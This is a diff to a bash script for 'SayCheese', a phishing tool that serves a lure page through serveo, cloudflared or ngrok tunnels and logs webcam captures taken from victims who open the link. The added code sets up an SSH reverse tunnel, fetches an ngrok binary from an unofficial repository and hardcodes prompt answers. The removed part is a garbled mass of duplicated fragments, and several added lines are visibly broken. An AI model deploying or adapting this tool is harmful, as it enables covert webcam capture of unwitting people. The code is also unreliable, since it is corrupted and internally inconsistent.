@@ -1,7 +1,6 @@
 #!/bin/bash
 # SayCheese v2.0
 # coded by: WHITE HAT
-# If you use any part from this code, giving me the credits. Read the Lincense!
 
 trap 'printf "\n";stop' 2
 
@@ -79,7 +78,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Photho is receiving!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -88,8 +87,29 @@ done
 
 }
 
-
 server() {
+
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+fi
+
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+
 rm -rf ${PWD}/cloudflare-log > /dev/null 2>&1
 
 if [[ ${PWD} == *'com.termux'* ]]; then
@@ -99,16 +119,13 @@ else
 cloudflared -url 127.0.0.1:3333 --logfile ${PWD}/cloudflare-log > /dev/null 2>&1 &
 sleep 5
 fi
-
-
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting  server...\e[0m\n" 
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting server...\e[0m\n"
 
 sleep 3
-send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log")
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
-
 
 payload_ngrok() {
 
@@ -118,18 +135,50 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
 }
-
 ngrok_server() {
 
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://github.com/uplodind/ngrok/raw/main/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget https://github.com/uplodind/ngrok/raw/main/ngrok-stable-linux-arm.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
+fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 5
+sleep 10
 
-link=$(curl -s -N http://localhost:4040/api/tunnels | grep -o  "https://[a-zA-Z0-9./?=_%:-]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
@@ -163,10 +212,9 @@ fi
 
 }
 
-
 payload() {
 
-send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log")
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
@@ -176,41 +224,19 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 start() {
 
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
+default_choose_sub="n"
+default_subdomain="saycheese$RANDOM"
 
 
 
-server
-payload
-checkfound
+#printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
-
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
+choose_sub="y"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m'  $
+
+subdomain="n"
 fi
 
 server
@@ -218,146 +244,6 @@ payload
 checkfound
 
 }
-
 banner
 dependencies
 start1
-
-t1
-
-
-
-
-
-t1
-
-
-
-found
-
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
-ound
-
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
-d
-
-}
-
-banner
-dependencies
-start1
-
-
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
-in
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
-d
-
-}
-
-banner
-dependencies
-start1
-
-
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
-3m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
-
-t1
-
-
-
